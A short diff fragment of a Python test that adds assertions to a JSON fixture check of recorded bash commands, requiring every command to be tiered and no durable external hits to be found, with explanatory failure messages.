     artifact = json.loads(BASH_SHAPE_FIXTURE.read_text())
+    assert artifact["commands_tiered"] == artifact["commands_total"], (
+        f"{artifact['commands_tiered']} of {artifact['commands_total']} commands were "
+        "tiered at record time, so this file's zero is again a measurement of a subset "
+        "wearing a corpus's wording")
+    assert artifact["durable_external_hits"] == [], artifact["durable_external_hits"][:2]
     assert artifact["commands_covered"] < artifact["commands_total"], (
         "the artifact now covers every recorded command, so the partial-coverage "
         "qualifier needs re-reading against the recorder before this node is edited")
